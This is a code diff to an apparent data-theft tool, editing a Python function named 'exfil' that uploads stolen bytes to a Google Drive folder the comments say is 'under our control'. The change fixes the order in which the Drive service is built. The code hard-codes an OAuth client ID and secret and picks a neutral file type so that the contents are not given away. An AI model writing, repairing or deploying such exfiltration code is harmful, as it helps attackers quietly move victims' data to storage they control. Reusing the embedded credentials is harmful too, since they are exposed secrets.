@@ -147,9 +147,6 @@ def sd():
 
 def exfil(info: bytes,file_name: str): 
 
-    service = build('drive', 'v3', credentials=creds)
-
-
     metadata = {
     'name' : file_name,
     'parents' : ['12xrEifuz-fyD9-yXpXupkUiPvLHAsU3p']#ID of Google Drive folder under our control
@@ -163,11 +160,15 @@ def exfil(info: bytes,file_name: str):
         client_secret ="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", 
         scopes = ["https://www.googleapis.com/auth/drive"])
     
+    service = build('drive', 'v3', credentials=creds)
+    
     upload_file = MediaIoBaseUpload(io.BytesIO(info), mimetype='application/octet-stream', resumable=True)#Default mimetype to not give away info
+
     results = service.files().create(
     body=metadata,
     media_body = upload_file
     )
+    
     response = None
     while response is None:
         response = results.next_chunk()
